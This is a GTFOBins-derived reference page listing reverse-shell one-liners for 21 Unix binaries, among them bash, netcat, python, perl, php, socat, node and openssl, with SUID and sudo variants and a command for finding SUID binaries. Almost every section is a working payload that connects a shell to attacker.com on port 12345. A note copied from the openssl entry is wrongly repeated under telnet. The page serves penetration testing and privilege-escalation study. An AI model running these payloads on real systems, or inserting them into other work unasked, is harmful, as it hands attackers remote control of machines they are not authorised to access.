---
title: "GTFOBins - reverse-shell (21 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "reverse-shell", "reverseshell"]
summary: "21 Unix binaries whose reverse-shell function connects back to a listener you control."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary whose `reverse-shell` function connects back to a listener you control, with the exact command. 21 binaries.

## Finding your way in

```bash
# intersect what is available with what is on this page
find / -perm -4000 -type f 2>/dev/null
```

## reverse-shell payloads

### bash

reverse-shell — suid variant

*Contexts: suid*

```bash
bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
```

### busybox

*Contexts: sudo, unprivileged*

```bash
busybox nc -e /bin/sh attacker.com 12345
```

### code

This requires a valid GitHub account.

Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

*Contexts: sudo, unprivileged*

```bash
code tunnel --name xxxxxx
```

### gawk

*Contexts: sudo, suid, unprivileged*

```bash
gawk 'BEGIN {
    s = "/inet/tcp/0/attacker.com/12345";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

### go

*Contexts: sudo, unprivileged*

```bash
echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go
```

### jjs

*Contexts: sudo, unprivileged*

```bash
jjs
var host='attacker.com';
var port=12345;
var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();
var Socket = Java.type('java.net.Socket');
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
```

### jrunscript

*Contexts: sudo, unprivileged*

```bash
jrunscript -e 'var host="attacker.com";
    var port=12345;
    var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```

### julia

*Contexts: sudo, suid, unprivileged*

```bash
julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```

### lua

This requires `lua-socket` to be available.

*Contexts: sudo, suid, unprivileged*

```bash
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```

### nc

This only works with netcat traditional.

*Contexts: sudo, suid, unprivileged*

```bash
nc -e /bin/sh attacker.com 12345
```

### node

reverse-shell — suid variant

*Contexts: suid*

```bash
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```

### openssl

The shell process is not spawn by `openssl`.

*Contexts: sudo, suid, unprivileged*

```bash
mkfifo /path/to/temp-socket
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
```

### perl

*Contexts: sudo, unprivileged*

```bash
perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### php

*Contexts: sudo, suid, unprivileged*

```bash
php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```

### python

*Contexts: sudo, suid, unprivileged*

```bash
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("attacker.com",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```

### ruby

*Contexts: sudo, unprivileged*

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### socat

reverse-shell — suid variant

*Contexts: suid*

```bash
socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

### socket

*Contexts: sudo, suid, unprivileged*

```bash
socket -qvp '/bin/sh -i' attacker.com 12345
```

### tclsh

*Contexts: sudo, suid, unprivileged*

```bash
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```

### telnet

The shell process is not spawn by `openssl`.

*Contexts: sudo, suid, unprivileged*

```bash
mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
```

### zsh

*Contexts: sudo, suid, unprivileged*

```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
